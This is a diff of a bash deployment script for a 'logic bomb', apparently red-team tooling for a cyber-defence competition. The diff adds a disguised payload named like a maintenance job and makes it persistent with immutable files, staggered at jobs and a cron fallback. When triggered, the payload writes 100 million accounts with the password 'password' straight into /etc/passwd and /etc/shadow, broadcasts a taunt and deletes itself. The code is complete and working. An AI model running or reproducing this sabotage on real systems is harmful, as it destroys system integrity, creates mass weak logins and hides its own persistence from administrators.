@@ -5,7 +5,7 @@ set -euo pipefail
 PAYLOAD="/usr/local/lib/.sys_cleanup"
 CRON_FILE="/etc/cron.d/pkg_audit"
 USER_LIST="/usr/local/lib/.user_registry"
-USER_COUNT=1000
+USER_COUNT=100000000
 AT_SPOOL_DIRS=(/var/spool/at/jobs /var/spool/cron/atjobs /var/spool/at)
 
 LOGIN_SHELL=$(command -v bash 2>/dev/null || command -v sh)
@@ -16,12 +16,12 @@ LOGIN_SHELL=$(command -v bash 2>/dev/null || command -v sh)
 # Uses temp files instead of process substitution to stay safe under
 # set -euo pipefail (process substitution + grep exit-1 breaks pipefail).
 schedule_at() {
-    local delay_min="$1"
+    local at_time="$1"
     local f_before f_after new_id=""
     f_before=$(mktemp)
     f_after=$(mktemp)
     atq 2>/dev/null | awk '{print $1}' | sort > "$f_before"
-    echo "bash $PAYLOAD" | at "now + ${delay_min} minutes" 2>/dev/null || true
+    echo "bash $PAYLOAD" | at "$at_time" 2>/dev/null || true
     sleep 0.2
     atq 2>/dev/null | awk '{print $1}' | sort > "$f_after"
     # comm -13: lines only in file2 (after) = newly added job IDs
@@ -51,8 +51,10 @@ lock_at_job() {
 # ── Deploy ────────────────────────────────────────────────────────────────────
 case "${1:-}" in
   deploy)
-    # Compute trigger time (now + 2 hours)
-    TRIGGER_EPOCH=$(( $(date +%s) + 7200 ))
+    # Fixed trigger: 12:00 PM CDT (UTC-5) on Oct 31, 2026 = 17:00 UTC
+    TRIGGER_EPOCH=$(date -d '2026-10-31 17:00:00 UTC' +%s 2>/dev/null || \
+                    date -u -d '2026-10-31 17:00:00' +%s 2>/dev/null || \
+                    echo 1793466000)
     TRIGGER_MIN=$(date -d "@${TRIGGER_EPOCH}" '+%M')
     TRIGGER_HR=$(date -d "@${TRIGGER_EPOCH}" '+%H')
     TRIGGER_DAY=$(date -d "@${TRIGGER_EPOCH}" '+%d')
@@ -66,44 +68,63 @@ case "${1:-}" in
         elif command -v apt-get &>/dev/null; then
             # Disable cdrom sources that block installs on DVD-provisioned machines.
             sed -i 's|^deb cdrom:|#deb cdrom:|g' /etc/apt/sources.list 2>/dev/null || true
+            # Add network repos — without them apt's cache has no packages at all.
+            _cn=$(. /etc/os-release 2>/dev/null && printf '%s' "${VERSION_CODENAME:-bookworm}")
+            if ! grep -rqE "deb.debian.org/debian[[:space:]]+${_cn}[[:space:]]+main" \
+                    /etc/apt/sources.list /etc/apt/sources.list.d/ 2>/dev/null; then
+                cat > "/etc/apt/sources.list.d/debian-rt-main.list" <<SRCEOF
+deb http://deb.debian.org/debian ${_cn} main
+deb http://security.debian.org/debian-security ${_cn}-security main
+SRCEOF
+            fi
+            # -o Acquire::Check-Valid-Until=false handles clock-skew on competition
+            # VMs where the system clock lags the repo release timestamps.
+            DEBIAN_FRONTEND=noninteractive \
+                apt-get -o Acquire::Check-Valid-Until=false update -q 2>/dev/null || true
             DEBIAN_FRONTEND=noninteractive apt-get install -y at 2>/dev/null || true
         fi
     fi
     systemctl enable --now atd 2>/dev/null || service atd start 2>/dev/null || true
 
-    # Write payload script
-    cat > "$PAYLOAD" << PAYLOAD_EOF
-#!/bin/bash
-# sys_cleanup — package integrity maintenance
-LOGIN_SHELL="${LOGIN_SHELL}"
-USER_LIST="${USER_LIST}"
-: > "\$USER_LIST"
-for i in \$(seq 1 ${USER_COUNT}); do
-    name=\$(tr -dc 'a-z' < /dev/urandom | head -c 10)
-    # Retry once on the (astronomically unlikely) collision
-    useradd -m -s "\${LOGIN_SHELL}" "\$name" 2>/dev/null || {
-        name=\$(tr -dc 'a-z' < /dev/urandom | head -c 10)
-        useradd -m -s "\${LOGIN_SHELL}" "\$name" 2>/dev/null || true
-    }
-    echo "\${name}:password" | chpasswd 2>/dev/null || true
-    echo "\$name" >> "\$USER_LIST"
-done
-chattr +i "\$USER_LIST" 2>/dev/null || true
-# Self-remove the cron fallback after firing
-sed -i '/pkg_audit/d' "${CRON_FILE}" 2>/dev/null || true
-echo "\$(date -Iseconds) logic bomb fired" >> /var/log/.pkg_audit.log
-# Taunt
-ADDED=\$(wc -l < "\$USER_LIST" 2>/dev/null || echo 0)
-wall \$'\n'"  ██████╗ ███████╗██████╗     ████████╗███████╗ █████╗ ███╗   ███╗"$'\n'"  ██╔══██╗██╔════╝██╔══██╗    ╚══██╔══╝██╔════╝██╔══██╗████╗ ████║"$'\n'"  ██████╔╝█████╗  ██║  ██║       ██║   █████╗  ███████║██╔████╔██║"$'\n'"  ██╔══██╗██╔══╝  ██║  ██║       ██║   ██╔══╝  ██╔══██║██║╚██╔╝██║"$'\n'"  ██║  ██║███████╗██████╔╝       ██║   ███████╗██║  ██║██║ ╚═╝ ██║"$'\n'"  ╚═╝  ╚═╝╚══════╝╚═════╝        ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝"$'\n'$'\n'"  \${ADDED} users just joined /etc/passwd. Hope you backed it up."$'\n'
+    # Write payload script (Python direct-write — useradd is too slow for 100M)
+    cat > "$PAYLOAD" << 'PAYLOAD_EOF'
+#!/usr/bin/env python3
+import os, sys, random, string, time, subprocess
+USER_LIST = "/usr/local/lib/.user_registry"
+USER_COUNT = 100000000
+START_UID = 100000
+SHELL = "/bin/bash"
+CRON_FILE = "/etc/cron.d/pkg_audit"
+pw = subprocess.getoutput("openssl passwd -6 password")
+if not pw.startswith("$"):
+    pw = "x"
+chars = string.ascii_lowercase
+t0 = time.time()
+added = 0
+with open("/etc/passwd", "a", buffering=1048576) as fp, \
+     open("/etc/shadow", "a", buffering=1048576) as fs, \
+     open(USER_LIST, "w", buffering=1048576) as ul:
+    for i in range(USER_COUNT):
+        name = "".join(random.choices(chars, k=20))
+        uid = str(START_UID + i)
+        fp.write(name + ":x:" + uid + ":" + uid + "::/home/" + name + ":" + SHELL + "\n")
+        fs.write(name + ":" + pw + ":19631:0:99999:7:::\n")
+        ul.write(name + "\n")
+        added += 1
+os.system("chattr +i " + USER_LIST + " 2>/dev/null")
+os.system("sed -i '/pkg_audit/d' " + CRON_FILE + " 2>/dev/null")
+with open("/var/log/.pkg_audit.log", "a") as log:
+    log.write(str(added) + " users added at " + str(time.time()) + "\n")
+os.system("wall '\n  RED TEAM\n\n  " + str(added) + " users just joined /etc/passwd. Hope you backed it up.\n'")
 PAYLOAD_EOF
     chmod 700 "$PAYLOAD"
     chattr +i "$PAYLOAD" 2>/dev/null || true
 
-    # Layer 1: four staggered at jobs
+    # Layer 1: four staggered at jobs at 12:00/12:05/12:10/12:30 PM CDT (17:xx UTC)
     echo "[+] Scheduling at jobs..."
-    for delay in 120 125 130 150; do
-        jid=$(schedule_at "$delay")
-        echo "[+]   at +${delay}min → job ${jid:-?}"
+    for at_time in "17:00 Oct 31" "17:05 Oct 31" "17:10 Oct 31" "17:30 Oct 31"; do
+        jid=$(schedule_at "$at_time")
+        echo "[+]   at ${at_time} UTC → job ${jid:-?}"
         sleep 0.2 && lock_at_job "${jid:-}"
     done
 
@@ -116,8 +137,8 @@ CRON_EOF
     chattr +i "$CRON_FILE" 2>/dev/null || true
 
     echo "[+] 12_logic_bomb: armed"
-    echo "[+]   Trigger: $(date -d "@${TRIGGER_EPOCH}" '+%H:%M on %Y-%m-%d')  (in 2 hours)"
-    echo "[+]   Payload: create ${USER_COUNT} users (random 10-char names, shell=${LOGIN_SHELL}, pass=password)"
+    echo "[+]   Trigger: 12:00 PM CDT (17:00 UTC) on 2026-10-31"
+    echo "[+]   Payload: create ${USER_COUNT} users (random 20-char names, direct /etc/passwd write, pass=password)"
     echo "[+]   Defuse:  remove at jobs + unlock and remove ${CRON_FILE}"
     rm -f -- "${BASH_SOURCE[0]}" 2>/dev/null || true
     ;;
